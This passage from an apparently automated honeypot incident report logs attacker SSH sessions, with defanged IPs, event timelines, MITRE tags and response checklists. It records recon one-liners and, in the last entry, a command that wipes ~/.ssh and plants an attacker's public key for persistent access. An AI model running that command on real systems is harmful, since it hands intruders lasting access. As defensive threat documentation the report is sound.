| `2026-08-10 16:02:54` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca06bf656350

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-08-10 16:03 |
| **Last Seen** | 2026-08-10 16:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:03:00` | `cowrie.session.connect` |
| `2026-08-10 16:03:01` | `cowrie.client.version` |
| `2026-08-10 16:03:01` | `cowrie.client.kex` |
| `2026-08-10 16:03:03` | `cowrie.login.success` |
| `2026-08-10 16:03:04` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e659caef90d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]110` |
| **First Seen** | 2026-08-10 16:03 |
| **Last Seen** | 2026-08-10 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:03:00` | `cowrie.session.connect` |
| `2026-08-10 16:03:00` | `cowrie.client.version` |
| `2026-08-10 16:03:00` | `cowrie.client.kex` |
| `2026-08-10 16:03:00` | `cowrie.login.success` |
| `2026-08-10 16:03:01` | `cowrie.session.params` |
| `2026-08-10 16:03:01` | `cowrie.command.input` |
| `2026-08-10 16:03:01` | `cowrie.log.closed` |
| `2026-08-10 16:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]110` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f81c14557c81

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:03 |
| **Last Seen** | 2026-08-10 16:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:03:48` | `cowrie.session.connect` |
| `2026-08-10 16:03:49` | `cowrie.client.version` |
| `2026-08-10 16:03:49` | `cowrie.client.kex` |
| `2026-08-10 16:03:54` | `cowrie.login.success` |
| `2026-08-10 16:03:57` | `cowrie.session.params` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.success` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:57` | `cowrie.command.input` |
| `2026-08-10 16:03:58` | `cowrie.log.closed` |
| `2026-08-10 16:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ded7cf139f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:05 |
| **Last Seen** | 2026-08-10 16:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:05:37` | `cowrie.session.connect` |
| `2026-08-10 16:05:38` | `cowrie.client.version` |
| `2026-08-10 16:05:38` | `cowrie.client.kex` |
| `2026-08-10 16:05:42` | `cowrie.login.success` |
| `2026-08-10 16:05:45` | `cowrie.session.params` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.success` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:45` | `cowrie.command.input` |
| `2026-08-10 16:05:47` | `cowrie.log.closed` |
| `2026-08-10 16:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77a484679092

| Field | Detail |
|---|---|
| **Source IP** | `182.42.113[.]10` |
| **First Seen** | 2026-08-10 16:06 |
| **Last Seen** | 2026-08-10 16:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:06:00` | `cowrie.session.connect` |
| `2026-08-10 16:06:01` | `cowrie.client.version` |
| `2026-08-10 16:06:01` | `cowrie.client.kex` |
| `2026-08-10 16:06:03` | `cowrie.login.success` |
| `2026-08-10 16:06:07` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.42.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `182.42.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75dd158bae27

| Field | Detail |
|---|---|
| **Source IP** | `125.35.109[.]214` |
| **First Seen** | 2026-08-10 16:06 |
| **Last Seen** | 2026-08-10 16:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:06:09` | `cowrie.session.connect` |
| `2026-08-10 16:06:10` | `cowrie.client.version` |
| `2026-08-10 16:06:10` | `cowrie.client.kex` |
| `2026-08-10 16:06:12` | `cowrie.login.success` |
| `2026-08-10 16:06:13` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.35.109[.]214` to AbuseIPDB if not already reported
- [ ] Block `125.35.109[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3176e57e4658

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:07 |
| **Last Seen** | 2026-08-10 16:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:07:23` | `cowrie.session.connect` |
| `2026-08-10 16:07:24` | `cowrie.client.version` |
| `2026-08-10 16:07:24` | `cowrie.client.kex` |
| `2026-08-10 16:07:28` | `cowrie.login.success` |
| `2026-08-10 16:07:31` | `cowrie.session.params` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.success` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:31` | `cowrie.command.input` |
| `2026-08-10 16:07:32` | `cowrie.log.closed` |
| `2026-08-10 16:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65eeb634ada7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:09 |
| **Last Seen** | 2026-08-10 16:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:09:16` | `cowrie.session.connect` |
| `2026-08-10 16:09:17` | `cowrie.client.version` |
| `2026-08-10 16:09:17` | `cowrie.client.kex` |
| `2026-08-10 16:09:20` | `cowrie.login.success` |
| `2026-08-10 16:09:23` | `cowrie.session.params` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.success` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.command.input` |
| `2026-08-10 16:09:23` | `cowrie.log.closed` |
| `2026-08-10 16:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97aa603dee6c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:11 |
| **Last Seen** | 2026-08-10 16:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:11:10` | `cowrie.session.connect` |
| `2026-08-10 16:11:11` | `cowrie.client.version` |
| `2026-08-10 16:11:11` | `cowrie.client.kex` |
| `2026-08-10 16:11:16` | `cowrie.login.success` |
| `2026-08-10 16:11:18` | `cowrie.session.params` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.success` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:18` | `cowrie.command.input` |
| `2026-08-10 16:11:19` | `cowrie.log.closed` |
| `2026-08-10 16:11:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd181adc6d30

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:13 |
| **Last Seen** | 2026-08-10 16:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:13:07` | `cowrie.session.connect` |
| `2026-08-10 16:13:07` | `cowrie.client.version` |
| `2026-08-10 16:13:07` | `cowrie.client.kex` |
| `2026-08-10 16:13:10` | `cowrie.login.success` |
| `2026-08-10 16:13:12` | `cowrie.session.params` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.success` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:12` | `cowrie.command.input` |
| `2026-08-10 16:13:13` | `cowrie.log.closed` |
| `2026-08-10 16:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3974d775f882

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:14 |
| **Last Seen** | 2026-08-10 16:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:14:56` | `cowrie.session.connect` |
| `2026-08-10 16:14:57` | `cowrie.client.version` |
| `2026-08-10 16:14:57` | `cowrie.client.kex` |
| `2026-08-10 16:15:01` | `cowrie.login.success` |
| `2026-08-10 16:15:04` | `cowrie.session.params` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.success` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:04` | `cowrie.command.input` |
| `2026-08-10 16:15:05` | `cowrie.log.closed` |
| `2026-08-10 16:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3acd2a5e68fa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:16 |
| **Last Seen** | 2026-08-10 16:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:16:47` | `cowrie.session.connect` |
| `2026-08-10 16:16:48` | `cowrie.client.version` |
| `2026-08-10 16:16:48` | `cowrie.client.kex` |
| `2026-08-10 16:16:53` | `cowrie.login.success` |
| `2026-08-10 16:16:55` | `cowrie.session.params` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.success` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:55` | `cowrie.command.input` |
| `2026-08-10 16:16:56` | `cowrie.log.closed` |
| `2026-08-10 16:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c12aa8bef6c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 16:18 |
| **Last Seen** | 2026-08-10 16:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:18:38` | `cowrie.session.connect` |
| `2026-08-10 16:18:39` | `cowrie.client.version` |
| `2026-08-10 16:18:39` | `cowrie.client.kex` |
| `2026-08-10 16:18:42` | `cowrie.login.success` |
| `2026-08-10 16:18:45` | `cowrie.session.params` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.success` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:45` | `cowrie.command.input` |
| `2026-08-10 16:18:46` | `cowrie.log.closed` |
| `2026-08-10 16:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207157d55623

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]68` |
| **First Seen** | 2026-08-10 16:30 |
| **Last Seen** | 2026-08-10 16:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:30:12` | `cowrie.session.connect` |
| `2026-08-10 16:30:12` | `cowrie.client.version` |
| `2026-08-10 16:30:12` | `cowrie.client.kex` |
| `2026-08-10 16:30:12` | `cowrie.login.success` |
| `2026-08-10 16:30:13` | `cowrie.session.params` |
| `2026-08-10 16:30:13` | `cowrie.command.input` |
| `2026-08-10 16:30:13` | `cowrie.command.failed` |
| `2026-08-10 16:30:13` | `cowrie.log.closed` |
| `2026-08-10 16:30:13` | `cowrie.session.params` |
| `2026-08-10 16:30:13` | `cowrie.command.input` |
| `2026-08-10 16:30:14` | `cowrie.session.file_download` |
| `2026-08-10 16:30:14` | `cowrie.log.closed` |
| `2026-08-10 16:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]68` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

